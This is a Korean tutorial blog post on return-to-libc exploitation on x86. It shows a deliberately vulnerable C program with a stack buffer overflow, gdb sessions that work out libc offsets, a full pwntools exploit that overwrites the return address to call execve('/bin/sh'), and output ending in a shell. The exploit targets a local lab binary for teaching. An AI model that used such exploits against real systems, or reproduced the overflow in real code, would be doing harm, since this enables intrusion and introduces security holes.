---
title: Return-to-libc - x86
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-libc]
math: true
mermaid: true
---

## Description

return address 영역에 공유 라이브러리 함수 주소로 변조해, 해당 함수를 호출하는 기법이다. NX bit(DEP)를 우회할 수 있다.

```
0xffffd578  0xffffd598  이전 호출 프레임(push ebp)
0xffffd57c  0x0804844e  Return Address
0xffffd580  0x1         Arg 1
0xffffd584  0x2         Arg 2
0xffffd588  0x3         Arg 3
0xffffd58c  0x4         Arg 4
```

ret2libc 기법 사용 시 인자 값을 전달하기 위해서 return address의 4 byte 뒤에 인자 값을 전달해야 한다.

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o ret2libc ret2libc.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50] = "";
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```

buf 크기는 50 byte이지만 100 byte를 입력받아 bof가 발생한다.

```
gdb-peda$ x/24wx $ebp
0xbfdcb318: 0x41414141         0x42424242 <- &execve 0x43434343 <- &exit 0x44444444 <- &"/bin/sh"
0xbfdcb328: 0x45454545 <- null 0x46464646 <- null    0x0000000a          0xb7e0b637
```

`execve()`와 "/bin/sh" 주소를 확인한다.

```
gdb-peda$ p printf
$1 = {<text variable, no debug info>} 0xb7e3c670 <__printf>
gdb-peda$ p execve-printf
$2 = 0x67170
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f4ea0b ("/bin/sh")
gdb-peda$ p 0xb7f4ea0b-0xb7e3c670
$3 = 0x11239b
gdb-peda$ p printf-exit
$4 = 0x1aca0
```

## Exploit code

```python
# Exploit Code
from pwn import *
p=process('ret2libc')

recv = p.recvline()
printf=int(recv.split(' ')[3],16)
execve = printf + int(0x67170)
binsh = printf + int(0x11239b)
exit = printf - int(0x1aca0)
null = printf - int(0x49530)

print('printf  :'+hex(printf))
print('execve  :'+hex(execve))
print('/bin/sh :'+hex(binsh))
print('exit    :'+hex(exit))
print('null    :'+hex(null))
p.sendline("A"*66+p32(execve)+p32(exit)+p32(binsh)+p32(null)+p32(null))

p.interactive()
```

## Exploit

```
bs@bs-virtual-machine:~$ python exploit.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[!] Could not find executable 'ret2libc' in $PATH, using './ret2libc' instead
[+] Starting local process './ret2libc': pid 16968
printf  :0xb7d94670
execve  :0xb7dfb7e0
/bin/sh :0xb7ea6a0b
exit    :0xb7d799d0
null    :0xb7d4b140
[*] Switching to interactive mode
$ id
uid=1000(bs) gid=1000(bs) groups=1000(bs),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

## Refereces
- [01.RTL(Return to Libc) - x86](https://www.lazenca.net/display/TEC/01.RTL%28Return+to+Libc%29+-+x86)